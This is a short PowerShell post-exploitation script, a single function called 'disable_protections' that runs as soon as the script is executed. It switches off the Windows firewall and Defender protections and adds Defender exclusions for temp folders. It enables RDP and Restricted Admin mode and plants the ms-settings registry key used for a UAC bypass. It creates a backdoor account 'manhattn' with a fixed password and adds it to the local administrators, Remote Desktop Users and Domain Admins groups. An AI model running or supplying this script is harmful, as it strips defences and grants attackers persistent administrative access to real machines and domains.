function disable_protections {
    netsh advfirewall set allprofiles state off
    set-MpPreference -DisableRealtimeMonitoring $true
    Set-MPPreference -DisableIOAVProtection $true
    Set-MPPreference -DisableIntrusionPreventionSystem $true
    Add-MpPreference -ExclusionPath C:\windows\temp
    Add-MpPreference -ExclusionPath C:\windows\tasks
    reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
    New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
    net user /add manhattn 'Password1!'
    net localgroup administrators manhattn /add
    net localgroup "Remote Desktop Users" manhattn /add
    Add-LocalGroupMember -Group "administrators" -Member "manhattn"
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member "manhattn"
    Add-ADGroupMember -Identity "Domain Admins" -Members manhattn
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
    New-NetFirewallRule -DisplayName "Remote Desktop" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389
}
disable_protections
